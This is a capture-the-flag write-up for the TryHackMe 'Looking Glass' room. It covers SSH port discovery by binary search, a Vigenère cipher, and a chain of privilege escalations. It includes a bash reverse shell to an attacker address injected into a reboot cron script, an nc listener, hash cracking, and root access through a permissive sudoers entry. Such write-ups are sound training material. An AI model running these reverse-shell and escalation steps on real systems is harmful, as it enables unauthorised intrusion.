# Looking Glass

**Room link:** https://tryhackme.com/room/lookingglass

1. `nmap -r` reveals SSH services on port 22 and on all ports 9000-13999. This range ports only answer with messages `Lower` or `Higher` before closing the connection.

2. We use binary search to locate the right port.

```python
import sys, subprocess

IP = '10.10.***.*'

pl = 9000 
ph = 13999

def ask_port(p):
    try:
        ps = subprocess.run(('ssh', '-q', '-o', 'StrictHostKeyChecking no', '-p', str(p), IP),
                            capture_output=True, timeout=5)
    except subprocess.TimeoutExpired:
        return None
    return ps.stdout.decode().strip()

while pl < ph:
    p = (pl+ph)//2
    print(f'Asking port {p}...', end=' ', flush=True, file=sys.stderr)
    ans = ask_port(p)
    if ans=='Lower':
        pl = p+1
        print(ans, flush=True, file=sys.stderr)
    elif ans=='Higher':
        ph = p-1
        print(ans, flush=True, file=sys.stderr)
    else:
        pl = ph = p
        print('Found!', flush=True, file=sys.stderr)
print(pl)
```

**NB:** That port is actually randomized.

3. We connect to that port through SSH.

```
$ ssh -p $PORT $TARGET_IP
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.
...
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

We get a [famous poem](https://en.wikipedia.org/wiki/Jabberwocky) (+ an additional strophe) that seems alphabetically-encrypted. Knowing the cleartext, we quickly figure out that it is a Vigenère cipher (available in [CyberChef](https://gchq.github.io/CyberChef/)) with the key `thealphabetcipher`.

Once deciphered, the last line reveals the secret:

```
Your secret is **REDACTED**
```

Entering that secret, we get credentials back:

```
jabberwock:**REDACTED**
```

**NB:** That password is actually randomized.

4. Log in as `jabberwock` through SSH (on port 22) and get the (mirrored) **user flag**.

```
jabberwock@looking-glass:~$ ls -l
total 12
-rw-rw-r-- 1 jabberwock jabberwock 935 Jun 30  2020 poem.txt
-rwxrwxr-x 1 jabberwock jabberwock  38 Jul  3  2020 twasBrillig.sh
-rw-r--r-- 1 jabberwock jabberwock  38 Jul  3  2020 user.txt
jabberwock@looking-glass:~$ cat user.txt
**DETCADER**
jabberwock@looking-glass:~$ sudo -l
...
    (root) NOPASSWD: /sbin/reboot
jabberwock@looking-glass:~$ cat /etc/crontab 
...
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

We are allowed to reboot and `tweedledum` conveniently executes our `twasBrillig.sh` script at reboot!

5. Inject a reverse shell (in an infinite loop in order to easily deal with unfortunate lost connections) and reboot.

```
jabberwock@looking-glass:~$ echo 'while true; do bash -i >& /dev/tcp/10.9.***.***/4444 0>&1; done' > twasBrillig.sh
jabberwock@looking-glass:~$ sudo reboot
```

6. Grab the reverse shell as `tweedledum` and upgrade it.

```
$ nc -lnvp 4444
tweedledum@looking-glass:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
$ stty raw -echo; fg
tweedledum@looking-glass:~$ ls -l
ls -l
total 8
-rw-r--r-- 1 root root 520 Jul  3  2020 humptydumpty.txt
-rw-r--r-- 1 root root 296 Jul  3  2020 poem.txt
tweedledum@looking-glass:~$ cat humptydumpty.txt 
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f726420697320************REDACTED************
```

[CrackStation](https://crackstation.net/) knows these hashes (SHA-256 of `maybe`, `one`, `of`, `these`, `is`, `the`, `password`) except the last one, which is the hex-encoding of:

```
the password is **REDACTED**
```

7. Log in as `humptydumpty` (using `su`). Nothing interesting at home this time...

Observe (this might take a bit of time...) that we have execution rights on `alice`'s home, that we can even navigate to `/home/alice/.ssh` and that the anticipated private key surprisingly belongs to us!

```
humptydumpty@looking-glass:~$ ls -lh /home
total 24K
drwx--x--x 6 alice        alice        4.0K Jul  3  2020 alice
drwx------ 3 humptydumpty humptydumpty 4.0K Jan  4 01:28 humptydumpty
drwxrwxrwx 5 jabberwock   jabberwock   4.0K Jul  3  2020 jabberwock
drwx------ 5 tryhackme    tryhackme    4.0K Jul  3  2020 tryhackme
drwx------ 3 tweedledee   tweedledee   4.0K Jul  3  2020 tweedledee
drwx------ 2 tweedledum   tweedledum   4.0K Jul  3  2020 tweedledum
humptydumpty@looking-glass:/home/alice/.ssh$ ls -l /home/alice/.ssh/id_rsa
-rw------- 1 humptydumpty humptydumpty 1679 Jul  3  2020 /home/alice/.ssh/id_rsa
humptydumpty@looking-glass:~$ cat /home/alice/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
...
```

8. Copy it and log in as `alice` through SSH. Without the password, we cannot run `sudo -l`.

Observe however (once again this might take a bit of time...) that anyone can read `/etc/sudoers.d/alice`!

```
alice@looking-glass:~$ ls -l /etc/sudoers.d/
total 16
-r--r----- 1 root root 958 Jan 18  2018 README
-r--r--r-- 1 root root  49 Jul  3  2020 alice
-r--r----- 1 root root  57 Jul  3  2020 jabberwock
-r--r----- 1 root root 120 Jul  3  2020 tweedles
alice@looking-glass:~$ cat /etc/sudoers.d/alice 
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

So we can run `bash` as `root` without password, but only on host `ssalg-gnikool`. Whatever, time to grab the (mirrored) **root flag**.

```
alice@looking-glass:~$ sudo -h ssalg-gnikool bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# cat /root/root.txt 
**DETCADER**
```
